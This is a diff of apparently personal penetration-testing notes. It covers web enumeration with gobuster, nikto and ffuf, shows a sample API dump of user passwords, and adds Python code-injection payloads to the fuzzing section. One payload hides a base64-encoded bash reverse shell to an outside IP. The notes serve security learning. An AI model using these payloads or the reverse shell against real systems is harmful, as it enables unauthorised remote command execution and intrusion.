@@ -10,7 +10,7 @@ sudo nmap -p80 --script=http-enum $IP
 ```bash
 gobuster dir -u http://loopback:9000 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -k -t 30
 gobuster dns -d http://$ip -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
-gobuster dir -u http://$IP -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -k -t 30 -x php,txt,html,whatever
+gobuster dir -u http://$ip -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -k -t 30 -x php,txt,html,whatever
 # for api busting
 cp /opt/SecLists/Discovery/Web-Content/api/objects.txt apis
 sed -i 's/^/{GOBUSTER}\//' apis
@@ -19,7 +19,7 @@ gobuster dir -u http://$IP:5002 -w /opt/SecLists/Discovery/Web-Content/combined_
 ```
 4. Nikto
 ```bash
-nikto --host $IP -ssl -evasion 1
+nikto --host $ip -ssl -evasion 1
 ```
 5. Manual code inspection
 
@@ -263,3 +263,18 @@ curl http://$ip/api/user/
 ````
 [{"login":"UserA","password":"test12","firstname":"UserA","lastname":"UserA","description":"Owner","id":10},{"login":"UserB","password":"test13","firstname":"UserB","lastname":"UserB","description":"Owner","id":30},{"login":"UserC","password":"test14","firstname":"UserC","lastname":"UserC","description":"Owner","id":6o},{"login":"UserD","password":"test15","firstname":"UserD","lastname":"UserD","description":"Owner","id":7o},{"login":"UserE","password":"test16","firstname":"UserE","lastname":"UserE","description":"Owner","id":100}]
 ````
+
+##### Fuzzing URL
+
+An amazing resource is Cobalt's SSTI page.
+```bash
+# Copy request from burpsuite to file, search.req
+# Insert FUZZ where you want to fuzz
+ffuf -request search.req -request-proto http -w /opt/SecLists/Fuzzing/special-chars.txt
+# If you wanted to match size of a particular response, you could add '-ms 0'
+# Check for quick SQL injection, adding url-encoded ';#---, so '%27%3B%23---'
+# Depends on the language being used, if Python, test string concatenation, such as adding "sup')%2B'dawg'"%23. The %23 is to comment out remaining command
+&query=sup')%2Bprint('hi')%23
+&query=sup')%2B__import__('os').system('id')%23
+&query=sup')%2B__import__('os').system('echo%20-n%20YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC84MCAwPiYxICcK%20|base64%20-d|bash')%23
+```
